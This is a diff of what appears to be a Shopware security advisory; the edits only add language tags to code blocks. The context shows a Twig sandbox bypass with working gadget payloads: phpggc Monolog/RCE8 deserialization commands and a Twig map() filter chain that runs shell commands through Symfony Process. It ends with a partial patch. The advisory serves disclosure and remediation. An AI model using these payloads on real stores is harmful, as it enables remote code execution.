@@ -165,13 +165,13 @@ Going back to [1], if $arrow is an array instead of a string or closure, the val
 #### Gadget 1: 
 Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
 Serialized payload generated using the phpggc tool: 
-```
+```bash
 ./phpggc -b Monolog/RCE8 system 'id'
 ```
 
 Compressed payload is generated using:
 
-```
+```bsh
 $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
 ```
 
@@ -193,7 +193,7 @@ Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Compo
 #### Gadget 3: 
 Using `\Symfony\Component\Process\Process::fromShellCommandline()` to invoke `proc_open("id > /tmp/pwned.txt")`:
 
-```
+```bash
 {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run())|length
 ```
 
@@ -215,12 +215,12 @@ For simplicity, the following proof-of-concept uses the administrator account to
 Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
 Serialized payload generated using the phpggc tool: 
 
-```
+```bash
 ./phpggc -b Monolog/RCE8 system 'id'
 ```
 Compressed payload is generated using: 
 
-```
+```bash
 $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' 
 ```
 
@@ -235,7 +235,7 @@ $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | h
 Patch the logic flaw in the `SecurityExtension` function declared in `src/Core/Framework/Adapter/Twig/SecurityExtension.php` to ensure that the parameter passed to the respective filter functions must either be a `string` or a `Closure` as such:
 An sample patch is shown below for the map() filter:
 
-```
+```php
     public function map(iterable $array, string|callable|\Closure $function): array
     {
 -       if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) {
